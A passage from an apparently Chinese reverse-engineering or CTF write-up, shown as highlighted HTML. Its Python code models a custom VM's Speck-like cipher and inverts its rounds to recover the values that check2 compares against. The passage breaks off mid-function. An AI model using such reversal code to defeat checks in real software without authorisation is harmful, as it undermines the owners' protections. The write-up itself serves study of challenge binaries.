</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>def</span> <span class=nf>loop_64bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_r2_schedule</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    r2,r3,r4,r5 的更新和 r0,r1 无关，所以可以单独跑出每一轮的 r2_k。
</span></span></span><span class=line><span class=cl><span class=s2>    返回长度为 27 的数组 R2[k] = 第 k 轮使用的 r2。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=mh>0x6df9f721</span>
</span></span><span class=line><span class=cl>    <span class=n>r3</span> <span class=o>=</span> <span class=mh>0x8d85b315</span>
</span></span><span class=line><span class=cl>    <span class=n>r4</span> <span class=o>=</span> <span class=mh>0x40bc0884</span>
</span></span><span class=line><span class=cl>    <span class=n>r5</span> <span class=o>=</span> <span class=mh>0x28e3d333</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>R2</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>):</span>  <span class=c1># k = 0..0x1a</span>
</span></span><span class=line><span class=cl>        <span class=n>R2</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=mh>0x1a</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 最后一轮只跑上半轮，不再更新 r2,r3,r4,r5</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 下半轮：只影响 r2,r3,r4,r5，不涉及数据 r0,r1</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_g_in</span> <span class=o>=</span> <span class=n>r3</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_g_in</span> <span class=o>=</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>        <span class=n>r2_g_in</span> <span class=o>=</span> <span class=n>k</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_A</span> <span class=o>=</span> <span class=n>func_A_32bit</span><span class=p>(</span><span class=n>r0_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_B</span> <span class=o>=</span> <span class=n>func_B_32bit</span><span class=p>(</span><span class=n>r0_H_A</span><span class=p>,</span> <span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_C</span> <span class=o>=</span> <span class=n>func_C_32bit</span><span class=p>(</span><span class=n>r0_H_B</span><span class=p>,</span> <span class=n>r2_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_D</span> <span class=o>=</span> <span class=n>func_D_32bit</span><span class=p>(</span><span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_E</span> <span class=o>=</span> <span class=n>func_E_32bit</span><span class=p>(</span><span class=n>r0_H_C</span><span class=p>,</span> <span class=n>r1_H_D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 更新到下一轮的 r2,r3,r4,r5</span>
</span></span><span class=line><span class=cl>        <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span> <span class=o>=</span> <span class=n>r1_H_E</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span><span class=p>,</span> <span class=n>r0_H_C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>R2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rol32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ror32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_upper_round</span><span class=p>(</span><span class=n>r0_next</span><span class=p>,</span> <span class=n>r1_next</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    逆向一轮上半轮：
</span></span></span><span class=line><span class=cl><span class=s2>      输入：本轮输出的 (r0_next, r1_next) 以及该轮使用的 r2_k
</span></span></span><span class=line><span class=cl><span class=s2>      输出：本轮输入的 (r0_prev, r1_prev)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>c0</span> <span class=o>=</span> <span class=n>r0_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>e1</span> <span class=o>=</span> <span class=n>r1_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=p>(</span><span class=n>e1</span> <span class=o>^</span> <span class=n>c0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>ror32</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>  <span class=c1># 逆 D: ROL3 -&gt; ROR3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b0</span> <span class=o>=</span> <span class=p>(</span><span class=n>c0</span> <span class=o>^</span> <span class=n>r2_k</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 C: XOR r2</span>
</span></span><span class=line><span class=cl>    <span class=n>a0</span> <span class=o>=</span> <span class=p>(</span><span class=n>b0</span> <span class=o>-</span> <span class=n>r1_prev</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 B: 减去 r1_prev</span>
</span></span><span class=line><span class=cl>    <span class=n>r0_prev</span> <span class=o>=</span> <span class=n>rol32</span><span class=p>(</span><span class=n>a0</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>  <span class=c1># 逆 A: ROR8 -&gt; ROL8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span></code></pre></td></tr></table></div></div><p>其中比较重要的是loop_64bit和build_r2_schedule，都传入了常量，但是发现顺序有所不同</p><p>这里列下check2和check3，需要注意在前一个check不过的情况下无法打印下一组的check日志，貌似前后有些依赖，第二轮的cmp值我并没有在vmcode里搜索到</p><p>check2的解密如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>mask64</span> <span class=o>=</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl><span class=n>mask32</span> <span class=o>=</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_A_32bit</span><span class=p>(</span><span class=n>r_in</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>r_in</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=n>r_in</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>^</span> <span class=n>r7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r6</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_B_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>r1</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r0</span> <span class=o>&amp;=</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_C_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_D_32bit</span><span class=p>(</span><span class=n>r_in</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=n>r_in</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=n>r_in</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>&lt;&lt;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&gt;&gt;</span> <span class=mi>29</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r6</span> <span class=o>=</span> <span class=p>(</span><span class=n>r6</span> <span class=o>^</span> <span class=n>r7</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r6</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func_E_32bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>r1</span> <span class=o>^</span> <span class=n>r0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>loop_64bit</span><span class=p>(</span><span class=n>r0</span><span class=p>,</span> <span class=n>r6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&amp;</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r0</span> <span class=o>=</span> <span class=p>(</span><span class=n>r0</span> <span class=o>^</span> <span class=n>r6</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r7</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>r7</span> <span class=o>=</span> <span class=p>(</span><span class=n>r7</span> <span class=o>&lt;&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>        <span class=n>r6</span> <span class=o>=</span> <span class=n>r7</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_r2_schedule</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    r2,r3,r4,r5 的更新和 r0,r1 无关，所以可以单独跑出每一轮的 r2_k。
</span></span></span><span class=line><span class=cl><span class=s2>    返回长度为 27 的数组 R2[k] = 第 k 轮使用的 r2。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=mh>0x6df9f721</span>
</span></span><span class=line><span class=cl>    <span class=n>r3</span> <span class=o>=</span> <span class=mh>0x8d85b315</span>
</span></span><span class=line><span class=cl>    <span class=n>r4</span> <span class=o>=</span> <span class=mh>0x40bc0884</span>
</span></span><span class=line><span class=cl>    <span class=n>r5</span> <span class=o>=</span> <span class=mh>0x28e3d333</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>R2</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>):</span>  <span class=c1># k = 0..0x1a</span>
</span></span><span class=line><span class=cl>        <span class=n>R2</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=mh>0x1a</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 最后一轮只跑上半轮，不再更新 r2,r3,r4,r5</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 下半轮：只影响 r2,r3,r4,r5，不涉及数据 r0,r1</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_g_in</span> <span class=o>=</span> <span class=n>r3</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_g_in</span> <span class=o>=</span> <span class=n>r2</span>
</span></span><span class=line><span class=cl>        <span class=n>r2_g_in</span> <span class=o>=</span> <span class=n>k</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_A</span> <span class=o>=</span> <span class=n>func_A_32bit</span><span class=p>(</span><span class=n>r0_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_B</span> <span class=o>=</span> <span class=n>func_B_32bit</span><span class=p>(</span><span class=n>r0_H_A</span><span class=p>,</span> <span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r0_H_C</span> <span class=o>=</span> <span class=n>func_C_32bit</span><span class=p>(</span><span class=n>r0_H_B</span><span class=p>,</span> <span class=n>r2_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_D</span> <span class=o>=</span> <span class=n>func_D_32bit</span><span class=p>(</span><span class=n>r1_g_in</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>r1_H_E</span> <span class=o>=</span> <span class=n>func_E_32bit</span><span class=p>(</span><span class=n>r0_H_C</span><span class=p>,</span> <span class=n>r1_H_D</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 更新到下一轮的 r2,r3,r4,r5</span>
</span></span><span class=line><span class=cl>        <span class=n>r2</span><span class=p>,</span> <span class=n>r3</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span> <span class=o>=</span> <span class=n>r1_H_E</span><span class=p>,</span> <span class=n>r4</span><span class=p>,</span> <span class=n>r5</span><span class=p>,</span> <span class=n>r0_H_C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>R2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rol32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ror32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_upper_round</span><span class=p>(</span><span class=n>r0_next</span><span class=p>,</span> <span class=n>r1_next</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    逆向一轮上半轮：
</span></span></span><span class=line><span class=cl><span class=s2>      输入：本轮输出的 (r0_next, r1_next) 以及该轮使用的 r2_k
</span></span></span><span class=line><span class=cl><span class=s2>      输出：本轮输入的 (r0_prev, r1_prev)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>c0</span> <span class=o>=</span> <span class=n>r0_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>e1</span> <span class=o>=</span> <span class=n>r1_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=p>(</span><span class=n>e1</span> <span class=o>^</span> <span class=n>c0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>ror32</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>  <span class=c1># 逆 D: ROL3 -&gt; ROR3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b0</span> <span class=o>=</span> <span class=p>(</span><span class=n>c0</span> <span class=o>^</span> <span class=n>r2_k</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 C: XOR r2</span>
</span></span><span class=line><span class=cl>    <span class=n>a0</span> <span class=o>=</span> <span class=p>(</span><span class=n>b0</span> <span class=o>-</span> <span class=n>r1_prev</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 B: 减去 r1_prev</span>
</span></span><span class=line><span class=cl>    <span class=n>r0_prev</span> <span class=o>=</span> <span class=n>rol32</span><span class=p>(</span><span class=n>a0</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>  <span class=c1># 逆 A: ROR8 -&gt; ROL8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_from_trace</span><span class=p>(</span><span class=n>cipher</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 阶段 9 逆：拆 64 位</span>
</span></span><span class=line><span class=cl>    <span class=n>final_r0</span> <span class=o>=</span> <span class=n>cipher</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>final_r1</span> <span class=o>=</span> <span class=p>(</span><span class=n>cipher</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 阶段 8 逆：利用 r2 调度，逆 27 轮上半轮</span>
</span></span><span class=line><span class=cl>    <span class=n>R2</span> <span class=o>=</span> <span class=n>build_r2_schedule</span><span class=p>()</span>
